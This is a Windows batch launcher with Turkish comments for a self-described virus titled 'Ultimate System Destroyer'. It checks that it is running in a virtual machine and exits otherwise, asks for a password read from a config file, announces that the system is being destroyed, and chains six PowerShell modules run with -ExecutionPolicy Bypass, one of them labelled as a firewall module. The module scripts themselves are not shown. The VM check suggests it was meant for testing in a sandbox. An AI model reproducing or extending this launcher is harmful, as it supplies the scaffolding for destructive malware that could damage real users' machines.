@echo off
chcp 65001 >nul
title EN - Ultimate System Destroyer
color 0c
cls

:: ============================================================
:: 1. OTOMATİK KONUM SABİTLEME (TÜM MODÜLLERİ KURTARAN SATIR)
:: ============================================================
:: Bu komut, Windows'un çalışma dizinini virüsün olduğu klasöre eşitler.
:: Böylece alt taraftaki modüllerin hiçbirine %~dp0 yazmana gerek kalmaz!
cd /d "%~dp0"

:: ============================================================
:: 2. ANA CİHAZ KORUMASI VE SANAL MAKİNE (VM) KONTROLÜ
:: ============================================================
SYSTEMINFO | findstr /I /C:"VirtualBox" /C:"VMware" /C:"QEMU" >nul
if %errorLevel% neq 0 (
    color 0c
    echo [EN] HATA: Bu yazılım YALNIZCA sanal makine (VM) içinde çalıştırılabilir!
    echo [EN] Güvenlik nedeniyle ana cihazda çalışma durduruldu.
    pause
    exit /b
)

:: ============================================================
:: 3. ŞİFRE KONTROLÜ
:: ============================================================
if exist config.txt (
    for /f "tokens=1,2 delims==" %%a in (config.txt) do (
        if "%%a"=="SIFRE" set sifre=%%b
    )
)

if defined sifre if not "%sifre%"=="" (
    set /p girilen="[EN] Sifre: "
    if not "%girilen%"=="%sifre%" (
        echo [EN] Hatali sifre.
        timeout /t 2 /nobreak >nul
        exit
    )
)

cls
:: ============================================================
:: 4. ANA MENU
:: ============================================================
echo ============================================================
echo   EN AKTIF
echo ============================================================
echo   Sistem yok ediliyor...
echo ============================================================
echo.
echo   Devam etmek icin bir tusa basin...
pause >nul

:: ============================================================
:: 5. MODULLER (SIRALI VE TEK TIKLA BYPASS)
:: ============================================================
:: Üstteki 'cd /d' komutu sayesinde buradaki isimlere dokunmana gerek yok!

:: 5.1 Güvenlik Duvarı
powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_guvenlik_duvari.ps1
if %errorlevel% neq 0 exit

:: 5.2 Müzik (arka planda, opsiyonel)
start /b powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_muzik.ps1

:: 5.3 Kendi Kendini Tamir
powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_kendi_tamir.ps1

:: 5.4 Ayar Okuyucu
powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_ayar_oku.ps1

:: 5.5 Kütüphane Kontrolü
powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_kutuphane_kontrol.ps1

:: 5.6 Ana Döngü
powershell.exe -NoProfile -ExecutionPolicy Bypass -File modul_ana_dongu.ps1

:: ============================================================
:: 6. BİTİŞ
:: ============================================================
echo [EN] Program sonlandirildi.
pause >nul
exit
